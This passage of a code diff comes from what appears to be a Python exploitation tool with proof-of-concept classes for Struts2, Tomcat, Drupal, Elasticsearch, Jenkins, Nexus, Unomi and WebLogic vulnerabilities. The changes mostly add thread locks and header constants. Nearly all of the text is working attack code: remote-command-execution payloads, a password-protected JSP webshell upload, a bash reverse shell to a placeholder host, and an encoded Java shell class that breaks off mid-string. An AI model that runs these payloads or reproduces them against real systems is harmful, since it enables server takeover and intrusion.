-            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
+            self.request = requests.get(self.url_061 + self.payload, headers=HEADERS, timeout=TIMEOUT, verify=False)
+            self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
             self.page = self.request.text
             self.page = etree.HTML(self.page)
             self.r = self.page.xpath('//a[@id]/@id')[0]
@@ -1455,30 +1765,32 @@ class ApacheStruts2():
             verify.connection_output(self.pocname)
         except Exception as error:
             verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
-
+        self.threadLock.release()
 
     def s2_devMode(self):
+        self.threadLock.acquire()
         self.pocname = "Apache Struts2: S2-devMode"
         self.method = "get"
         self.rawdata = "null"
         self.info = color.rce()
-        self.payload = self.payload_s2_devMode.replace("RECOMMAND",CMD)
+        self.payload = self.payload_s2_devMode.replace("RECOMMAND", CMD)
         try:
-            self.request = requests.get(self.url+self.payload, headers=headers, timeout=TIMEOUT, verify=False, allow_redirects=False)
-            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
+            self.request = requests.get(self.url + self.payload, headers=HEADERS, timeout=TIMEOUT, verify=False,
+                                        allow_redirects=False)
+            self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
             verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
             verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
             verify.connection_output(self.pocname)
         except Exception as error:
-            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info) 
-
-
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
 class ApacheTomcat():
     def __init__(self, url):
         self.url = url
+        self.threadLock = threading.Lock()
         self.getipport = urlparse(self.url)
         self.hostname = self.getipport.hostname
         self.port = self.getipport.port
@@ -1496,7 +1808,9 @@ class ApacheTomcat():
             'ose();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if("password".equ' \
             'als(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCm' \
             'd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>'
+
     def tomcat_examples(self):
+        self.threadLock.acquire()
         self.pocname = "Apache Tomcat: Examples File"
         self.info = "null"
         self.rawdata = "null"
@@ -1505,7 +1819,7 @@ class ApacheTomcat():
         self.info = color.green("[url:"+self.url+self.payload+" ]")
         self.r = "PoCWating"
         try:
-            self.request = requests.get(self.url+self.payload, headers=headers, timeout=TIMEOUT, verify=False)
+            self.request = requests.get(self.url+self.payload, headers=HEADERS, timeout=TIMEOUT, verify=False)
             if self.request.status_code == 200 and r"Session ID:" in self.request.text:
                 self.r = "PoCSuCCeSS"
             self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
@@ -1515,10 +1829,11 @@ class ApacheTomcat():
         except requests.exceptions.ConnectionError as error:
             verify.connection_output(self.pocname)
         except Exception as error:
-            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)               
-                
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
         
     def cve_2017_12615(self):
+        self.threadLock.acquire()
         self.pocname = "Apache Tomcat: CVE-2017-12615"
         self.name = ''.join(random.choices(string.ascii_letters+string.digits, k=8))
         self.webshell = "/"+self.name+".jsp/"
@@ -1529,16 +1844,15 @@ class ApacheTomcat():
         try:
             self.method = "put"
             if VULN is None:
-                self.request = requests.put(self.url+self.webshell, data=self.payload1, headers=headers, timeout=TIMEOUT, verify=False)
+                self.request = requests.put(self.url+self.webshell, data=self.payload1, headers=HEADERS, timeout=TIMEOUT, verify=False)
                 self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
-                self.request = requests.get(self.url+self.webshell[:-1], headers=headers, timeout=TIMEOUT, verify=False)
+                self.request = requests.get(self.url+self.webshell[:-1], headers=HEADERS, timeout=TIMEOUT, verify=False)
                 self.info = color.upload()+color.green(" [url:"+self.url+"/"+self.name+".jsp ]")
-                #self.info = vulninfo.info_cve201712615(self.url)
                 verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
             else:
-                self.request = requests.put(self.url+self.webshell, data=self.payload2, headers=headers, timeout=TIMEOUT, verify=False)
+                self.request = requests.put(self.url+self.webshell, data=self.payload2, headers=HEADERS, timeout=TIMEOUT, verify=False)
                 self.urlcmd = self.url+"/"+self.name+".jsp?pwd=password&cmd="+CMD
-                self.request = requests.get(self.urlcmd, headers=headers, timeout=TIMEOUT, verify=False)
+                self.request = requests.get(self.urlcmd, headers=HEADERS, timeout=TIMEOUT, verify=False)
                 self.r = "Put Webshell: "+self.urlcmd+"\n-------------------------\n"+self.request.text
                 verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
@@ -1547,8 +1861,10 @@ class ApacheTomcat():
             verify.connection_output(self.pocname)
         except Exception as error:
             verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
     def cve_2020_1938(self):
+        self.threadLock.acquire()
         self.pocname = "Apache Tomcat: CVE-2020-1938"
         self.output_method = "ajp"
         self.default_port = self.port
@@ -1582,7 +1898,7 @@ class ApacheTomcat():
             if self.username is not None and self.password is not None:
                 self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic "+ str(("%s:%s" %(self.username, self.password)).encode('base64').replace("\n" ""))
             for h in self.default_headers:
-                self.forward_request.request_headers[h] = headers[h]
+                self.forward_request.request_headers[h] = HEADERS[h]
             for a in self.attributes:
                 self.forward_request.attributes.append(a)
             self.responses = self.forward_request.send_and_receive(self.socket, self.stream)
@@ -1599,6 +1915,7 @@ class ApacheTomcat():
             verify.timeout_output(self.pocname)
         except Exception as error:
             verify.generic_output(self.request, self.pocname, self.output_method, self.rawdata, self.info)
+        self.threadLock.release()
 
     # Apache Tomcat CVE-2020-1938 "AJP" protocol check def
     def __prepare_ajp_forward_request(self, target_host, req_uri, method=AjpForwardRequest.GET):
@@ -1625,13 +1942,17 @@ class ApacheTomcat():
         self.fr.attributes = []
         return self.fr
 
-
 class ApacheUnomi():
     def __init__(self, url):
         self.url = url
-        self.payload_cve_2020_13942 = '''{ "filters": [ { "id": "myfilter1_anystr", "filters": [ { "condition": {  "parameterValues": {  "": "script::Runtime r = Runtime.getRuntime(); r.exec(\\"RECOMMAND\\");" }, "type": "profilePropertyCondition" } } ] } ], "sessionId": "test-demo-session-id_anystr" }'''
+        self.threadLock = threading.Lock()
+        self.payload_cve_2020_13942 = '''{ "filters": [ { "id": "myfilter1_anystr", "filters": [ { "condition": {''' \
+                                      '''"parameterValues": {  "": "script::Runtime r = Runtime.getRuntime(); ''' \
+                                      '''r.exec(\\"RECOMMAND\\");" }, "type": "profilePropertyCondition" } } ] } ''' \
+                                      '''], "sessionId": "test-demo-session-id_anystr" }'''
 
     def cve_2020_13942(self):
+        self.threadLock.acquire()
         self.pocname = "Apache Unomi: CVE-2020-13942"
         self.method = "post"
         self.rawdata = "null"
@@ -1640,7 +1961,7 @@ class ApacheUnomi():
         self.payload = self.payload_cve_2020_13942.replace("RECOMMAND", CMD)
         self.headers = {
             'Host': '34.87.38.169:8181',
-            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
+            'User-Agent': USER_AGENT,
             'Accept': '*/*',
             'Connection': 'close',
             'Content-Type': 'application/json'
@@ -1663,11 +1984,12 @@ class ApacheUnomi():
             verify.connection_output(self.pocname)
         except Exception as error:
             verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
-
+        self.threadLock.release()
 
 class Drupal():
     def __init__(self, url):
         self.url = url
+        self.threadLock = threading.Lock()
         self.payload_cve_2018_7600 = ("form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=system&mail"
             "[#type]=markup&mail[#markup]=RECOMMAND")
         self.payload_cve_2019_6340 = "{\r\n\"link\":[\r\n{\r\n\"value\":\"link\",\r\n\"options\":\"O:24:\\\"" \
@@ -1680,6 +2002,7 @@ class Drupal():
             "\"\r\n}\r\n}\r\n}"
             
     def cve_2018_7600(self):
+        self.threadLock.acquire()
         self.pocname = "Drupal: CVE-2018-7600"
         self.method = "post"
         self.rawdata = "null"
@@ -1689,7 +2012,7 @@ class Drupal():
         self.path = "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" 
         try:
             if VULN is None:
-                self.request = requests.post(self.url + self.path, data=self.payload, headers=headers, timeout=TIMEOUT, verify=False)
+                self.request = requests.post(self.url + self.path, data=self.payload, headers=HEADERS, timeout=TIMEOUT, verify=False)
                 self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
                 if r"LISTEN" not in self.request.text and r"class=\u0022ajax-new-content\u0022\u003E\u003C\/span\u003E" in self.request.text:
                     self.r = "PoCSuCCeSS"
@@ -1697,7 +2020,7 @@ class Drupal():
                 else:
                     verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
             else:
-                self.request = requests.post(self.url + self.path, data=self.payload, headers=headers, timeout=TIMEOUT, verify=False)
+                self.request = requests.post(self.url + self.path, data=self.payload, headers=HEADERS, timeout=TIMEOUT, verify=False)
                 verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
             verify.timeout_output(self.pocname)
@@ -1705,8 +2028,10 @@ class Drupal():
             verify.connection_output(self.pocname)
         except Exception as error:
             verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
-            
+        self.threadLock.release()
+
     def cve_2018_7602(self):
+        self.threadLock.acquire()
         self.pocname = "Drupal: CVE-2018-7602"
         self.method = "get"
         self.rawdata = "null"
@@ -1714,7 +2039,7 @@ class Drupal():
         self.r = "PoCWating"
         try:
             if VULN is None:
-                self.request = requests.get(self.url + "/CHANGELOG.txt", data=self.payload, headers=headers, 
+                self.request = requests.get(self.url + "/CHANGELOG.txt", data=self.payload, headers=HEADERS, 
                     timeout=TIMEOUT, verify=False)
                 self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
                 self.allver = re.findall(r"([\d][.][\d]?[.]?[\d])", self.request.text)
@@ -1727,16 +2052,16 @@ class Drupal():
                 self.session = requests.Session()
                 self.get_params = {'q':'user/login'}
                 self.post_params = {'form_id':'user_login', 'name': DRUPAL_U, 'pass' : DRUPAL_P, 'op':'Log in'}
-                self.session.post(self.url, params=self.get_params, data=self.post_params, headers=headers, 
+                self.session.post(self.url, params=self.get_params, data=self.post_params, headers=HEADERS, 
                     timeout=TIMEOUT, verify=False)
                 self.get_params = {'q':'user'}
-                self.r = self.session.get(self.url, params=self.get_params, headers=headers, timeout=TIMEOUT, verify=False)
+                self.r = self.session.get(self.url, params=self.get_params, headers=HEADERS, timeout=TIMEOUT, verify=False)
                 self.soup = BeautifulSoup(self.r.text, "html.parser")
                 self.user_id = self.soup.find('meta', {'property': 'foaf:name'}).get('about')
                 if "?q=" in self.user_id:
                     self.user_id = self.user_id.split("=")[1]
                 self.get_params = {'q': self.user_id + '/cancel'}
-                self.r = self.session.get(self.url, params=self.get_params, headers=headers, timeout=TIMEOUT, verify=False)
+                self.r = self.session.get(self.url, params=self.get_params, headers=HEADERS, timeout=TIMEOUT, verify=False)
                 self.soup = BeautifulSoup(self.r.text, "html.parser")
                 self.form = self.soup.find('form', {'id': 'user-cancel-confirm-form'})
                 self.form_token = self.form.find('input', {'name': 'form_token'}).get('value')
@@ -1744,14 +2069,14 @@ class Drupal():
                     'destination' : self.user_id +'/cancel?q[%23post_render][]=passthru&q[%23type]=markup&q[%23markup]=' + CMD}
                 self.post_params = {'form_id':'user_cancel_confirm_form','form_token': self.form_token, 
                     '_triggering_element_name':'form_id', 'op':'Cancel account'}
-                self.r = self.session.post(self.url, params=self.get_params, data=self.post_params, headers=headers, 
+                self.r = self.session.post(self.url, params=self.get_params, data=self.post_params, headers=HEADERS, 
                     timeout=TIMEOUT, verify=False)
                 self.soup = BeautifulSoup(self.r.text, "html.parser")
                 self.form = self.soup.find('form', {'id': 'user-cancel-confirm-form'})
                 self.form_build_id = self.form.find('input', {'name': 'form_build_id'}).get('value')
                 self.get_params = {'q':'file/ajax/actions/cancel/#options/path/' + self.form_build_id}
                 self.post_params = {'form_build_id':self.form_build_id}
-                self.r = self.session.post(self.url, params=self.get_params, data=self.post_params, headers=headers, 
+                self.r = self.session.post(self.url, params=self.get_params, data=self.post_params, headers=HEADERS, 
                     timeout=TIMEOUT, verify=False)
                 verify.generic_output(self.r.text, self.pocname, self.method, self.rawdata, self.info) 
         except requests.exceptions.Timeout as error:
@@ -1760,8 +2085,10 @@ class Drupal():
             verify.connection_output(self.pocname)
         except Exception as error:
             verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
     def cve_2019_6340(self):
+        self.threadLock.acquire()
         self.pocname = "Drupal: CVE-2019-6340"
         self.method = "post"
         self.rawdata = "null"
@@ -1771,7 +2098,7 @@ class Drupal():
         self.cmd_len = len(CMD)
         self.payload = self.payload_cve_2019_6340 % (self.cmd_len, CMD, self.url)
         self.headers = {
-            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
+            'User-Agent': USER_AGENT,
             'Connection': "close",
             'Content-Type': "application/hal+json",
             'Accept': "*/*",
@@ -1803,12 +2130,14 @@ class Drupal():
         except requests.exceptions.ConnectionError as error:
             verify.connection_output(self.pocname)
         except Exception as error:
-            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)  
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
 class Elasticsearch():
     def __init__(self, url):
         # http.client.HTTPConnection._http_vsn_str = 'HTTP/1.1'
         self.url = url
+        self.threadLock = threading.Lock()
         self.getipport = urlparse(self.url)
         self.hostname = self.getipport.hostname
         self.port = self.getipport.port
@@ -1826,14 +2155,16 @@ class Elasticsearch():
             'Accept': '*/*',
             'Connection': 'close',
             'Accept-Language': 'en',
-            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
+            'User-Agent': USER_AGENT,
             'Content-Type': 'application/x-www-form-urlencoded'
         }
         self.payload_cve_2014_3120 = r'''{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":''' \
             r'''{"command":{"script":"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec''' \
             r'''(\"RECOMMAND\").getInputStream()).useDelimiter(\"\\\\A\").next();"}}}'''
         self.payload_cve_2015_1427 = r'''{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"RECOMMAND\").getText()"}}}'''
+
     def cve_2014_3120(self):
+        self.threadLock.acquire()
         self.pocname = "Elasticsearch: CVE-2014-3120"
         self.method = "post"
         self.rawdata = "null"
@@ -1852,8 +2183,10 @@ class Elasticsearch():
             verify.connection_output(self.pocname)
         except Exception as error:
             verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
     def cve_2015_1427(self):
+        self.threadLock.acquire()
         self.pocname = "Elasticsearch: CVE-2015-1427"
         self.method = "post"
         self.rawdata = "null"
@@ -1866,7 +2199,7 @@ class Elasticsearch():
             'Accept': '*/*',
             'Connection': 'close',
             'Accept-Language': 'en',
-            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
+            'User-Agent': USER_AGENT,
             'Content-Type': 'application/text'
         }
         try:
@@ -1883,16 +2216,19 @@ class Elasticsearch():
             verify.connection_output(self.pocname)
         except Exception as error:
             verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
 class Jenkins():
     def __init__(self, url):
         self.url = url
+        self.threadLock = threading.Lock()
         self.payload_cve_2018_1000861 = '/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.' \
             'scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public+class+' \
             'x+%7B%0A++public+x%28%29%7B%0A++++%22bash+-c+%7Becho%2CRECOMMAND%7D%7C%7Bbase64%2C-d%7D%7C%7B' \
             'bash%2C-i%7D%22.execute%28%29%0A++%7D%0A%7D'
             
     def cve_2017_1000353(self):
+        self.threadLock.acquire()
         self.pocname = "Jenkins: CVE-2017-1000353"
         self.method = "get"
         self.rawdata = "null"
@@ -1901,7 +2237,7 @@ class Jenkins():
         self.r = "PoCWating"     
         try:
             if VULN is None:
-                self.request = requests.get(self.url, headers=headers, timeout=TIMEOUT, verify=False)
+                self.request = requests.get(self.url, headers=HEADERS, timeout=TIMEOUT, verify=False)
                 self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
                 self.jenkins_version = self.request.headers['X-Jenkins']
                 self.jenkinsvuln = "2.56"
@@ -1924,9 +2260,11 @@ class Jenkins():
         except requests.exceptions.ConnectionError as error:
             verify.connection_output(self.pocname)
         except Exception as error:
-            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)     
-    
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
+
     def cve_2018_1000861(self):
+        self.threadLock.acquire()
         self.pocname = "Jenkins: CVE-2018-1000861"
         self.method = "get"
         self.rawdata = "null"
@@ -1938,25 +2276,27 @@ class Jenkins():
         self.info = color.rce()
         try:
             try:
-                self.request = requests.get(self.url, timeout=TIMEOUT, verify=False)
+                self.request = requests.get(self.url, headers=HEADERS, timeout=TIMEOUT, verify=False)
                 self.jenkins_version = self.request.headers['X-Jenkins']
                 self.info += color.green(" [version:" + self.jenkins_version + "]")
             except:
                 pass
-            self.request = requests.get(self.url + self.payload, timeout=TIMEOUT, verify=False)
+            self.request = requests.get(self.url + self.payload, headers=HEADERS, timeout=TIMEOUT, verify=False)
             self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
-            self.request = requests.get(self.url + "/robots.txt", timeout=TIMEOUT, verify=False)
+            self.request = requests.get(self.url + "/robots.txt", headers=HEADERS, timeout=TIMEOUT, verify=False)
             verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
             verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
             verify.connection_output(self.pocname)
         except Exception as error:
-            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)            
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
 class Nexus():
     def __init__(self, url):
         self.url = url
+        self.threadLock = threading.Lock()
         self.payload_cve_2019_7238 = "{\"action\": \"coreui_Component\", \"type\": \"rpc\", \"tid\": 8, \"data\": [{" \
             "\"sort\": [{\"direction\": \"ASC\", \"property\": \"name\"}], \"start\": 0, \"filter\": [{\"property\":" \
             " \"repositoryName\", \"value\": \"*\"}, {\"property\": \"expression\", \"value\": \"function(x, y, z, c" \
@@ -2079,6 +2419,7 @@ class Nexus():
             """$fe$H$c3$e0$Q$5e$fb$N$A$A').newInstance()}"]}}"""
             
     def cve_2019_7238(self):
+        self.threadLock.acquire()
         self.pocname = "Nexus Repository Manager: CVE-2019-7238"
         self.payload = self.payload_cve_2019_7238.replace("RECOMMAND",CMD)
         self.method = "post"
@@ -2086,7 +2427,7 @@ class Nexus():
         self.info = color.rce()
         self.headers = {
             'Accept': '*/*',
-            'User-agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
+            'User-agent': USER_AGENT,
             'Content-Type': 'application/json'
         }
         try:
@@ -2110,8 +2451,10 @@ class Nexus():
             verify.connection_output(self.pocname)
         except Exception as error:
             verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
     def cve_2020_10199(self):
+        self.threadLock.acquire()
         http.client.HTTPConnection._http_vsn_str = 'HTTP/1.1'
         self.pocname = "Nexus Repository Manager: CVE-2020-10199"
         self.method = "post"
@@ -2121,7 +2464,7 @@ class Nexus():
             'Connection': 'keep-alive',
             'X-Requested-With': 'XMLHttpRequest',
             'X-Nexus-UI': 'true',
-            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36'
+            'User-Agent': USER_AGENT
         }
         try:
             self.us = base64.b64encode(str.encode(NEXUS_U))
@@ -2140,7 +2483,7 @@ class Nexus():
                 'X-Nexus-UI': "true",
                 'Content-Type': "application/json",
                 '404': "" + CMD + "",
-                'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36",
+                'User-Agent': USER_AGENT,
                 'Cookie': "jenkins-timestamper-offset=-28800000; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=1583249520;" \
                     "NX-ANTI-CSRF-TOKEN=0.6153568974227819; NXSESSIONID=" + self.session + ""
             }
@@ -2154,9 +2497,11 @@ class Nexus():
             verify.connection_output(self.pocname)
         except Exception as error:
             verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
 class OracleWeblogic():
     def __init__(self, url):
+        self.threadLock = threading.Lock()
         http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'
         self.url = url
         self.getipport = urlparse(self.url)
@@ -2172,7 +2517,7 @@ class OracleWeblogic():
             self.url = "http://"+self.hostname+":"+str(self.port)
         self.headers = {
             'Accept': 'text/html, application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'User-agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
+            'User-agent': USER_AGENT,
             'content-type': 'text/xml'
         }
         
@@ -2187,8 +2532,8 @@ class OracleWeblogic():
             'ttp://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv' \
             ':Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http' \
             '://bea.com/2004/06/soap/workarea/"><void class="java.lang.ProcessBuilder"><array class="java.lang.Strin' \
-            'g" length="3">            <void index="0"><string>/bin/bash</string></void>            <void index="1"><string>-c</string></voi' \
-            'd>            <void index="2"><string>bash -i &gt;&amp; /dev/tcp/REIP/REPORT 0&gt;&amp;1</string></void></array><vo' \
+            'g" length="3"><void index="0"><string>/bin/bash</string></void><void index="1"><string>-c</string></voi' \
+            'd><void index="2"><string>bash -i &gt;&amp; /dev/tcp/REIP/REPORT 0&gt;&amp;1</string></void></array><vo' \
             'id method="start"/></void></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soa' \
             'penv:Body></soapenv:Envelope>'
         self.payload_cve_2017_3506_poc = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/' \
@@ -2206,7 +2551,76 @@ class OracleWeblogic():
             '); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print("</pre>"); } %>]]></string></void' \
             '><void method="close"/></object></java></java></work:WorkContext></soapenv:Header><soapenv:Body/></soap' \
             'env:Envelope>'
-        self.payload_cve_2017_10271_rce = ('<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><void class="sun.misc.BASE64Decoder"><void method="decodeBuffer" id="byte_arr"><string>yv66vgAAADIA7goAOwB+BwB/CgACAIAHAIEKAAQAfggAggoAgwCECgAEAIUKAAIAhgoAAgCHCgACAIgHAIkIAIoKAIsAjAoAEgCNCACOCgASAI8HAJAIAJEIAJIIAJMIAJQKAJUAlgoAlQCXCgCYAJkHAJoKABoAfgoAmwCcCgAaAJ0KABoAngoAEgCfCgCgAKEHAKIKACEAowcApAoAIwClCgCmAKcKACMAqAgAdwgAqQoAqgCrCABOCgASAKwIAFsIAK0IAK4IAK8KAKYAsAoAOgCxCgCyALMKALIAhwoApgC0CgC1ALYIAEMIAEkIAEsKADoAtwcAuAcAuQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAfTHN1cGVybWFuL3NoZWxscy9IdHRwRWNob1NoZWxsOwEABnVwbG9hZAEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspVgEAEGZpbGVPdXRwdXRTdHJlYW0BABpMamF2YS9pby9GaWxlT3V0cHV0U3RyZWFtOwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAARwYXRoAQASTGphdmEvbGFuZy9TdHJpbmc7AQAEdGV4dAEADVN0YWNrTWFwVGFibGUHAIkBAARleGVjAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAARuYW1lAQAEY21kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAJpbgEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAA2J1ZgEAAltCAQADbGVuAQABSQEAA291dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAANjbWQHAJAHAFIHALoHAFYHAJoBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAuwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAZyZXN1bHQBAAZ0aHJlYWQBAB1Md2VibG9naWMvd29yay9FeGVjdXRlVGhyZWFkOwEAA3JlcQEALkx3ZWJsb2dpYy9zZXJ2bGV0L2ludGVybmFsL1NlcnZsZXRSZXF1ZXN0SW1wbDsBAANyZXMBAC9Md2VibG9naWMvc2VydmxldC9pbnRlcm5hbC9TZXJ2bGV0UmVzcG9uc2VJbXBsOwEAM0x3ZWJsb2dpYy9zZXJ2bGV0L2ludGVybmFsL1NlcnZsZXRPdXRwdXRTdHJlYW1JbXBsOwEABHR5cGUHAKIHAKQHALwHAL0BAApTb3VyY2VGaWxlAQASSHR0cEVjaG9TaGVsbC5qYXZhDAA8AD0BABhqYXZhL2lvL0ZpbGVPdXRwdXRTdHJlYW0MADwAvgEAFnN1bi9taXNjL0JBU0U2NERlY29kZXIBAAV1dGYtOAcAvwwAwADBDADCAMMMAMQAxQwAxgA9DADHAD0BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAHb3MubmFtZQcAyAwAyQBPDADKAMsBAAN3aW4MAMwAzQEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MBAAJzaAEAAi1jBwDODADPANAMAE4A0QcA0gwA0wDUAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0HALoMANUA1gwAxADXDADYANkMADwAxQcA2gwA2wDcAQAbd2VibG9naWMvd29yay9FeGVjdXRlVGhyZWFkDADdAN4BACx3ZWJsb2dpYy9zZXJ2bGV0L2ludGVybmFsL1NlcnZsZXRSZXF1ZXN0SW1wbAwA3wDgBwC8DADhAOIMAOMA5AEAAAcA5QwA5gDBDADnAOgBAAZ3aG9hbWkBAAVpc1Z1bAEAAm9rDADpAEQMAE4ATwcAvQwA6gC+DADrAOwHAO0MAMQAvgwAQwBEAQAdc3VwZXJtYW4vc2hlbGxzL0h0dHBFY2hvU2hlbGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JbnB1dFN0cmVhbQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEALXdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvU2VydmxldFJlc3BvbnNlSW1wbAEAMXdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvU2VydmxldE91dHB1dFN0cmVhbUltcGwBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABNqYXZhL25ldC9VUkxEZWNvZGVyAQAGZGV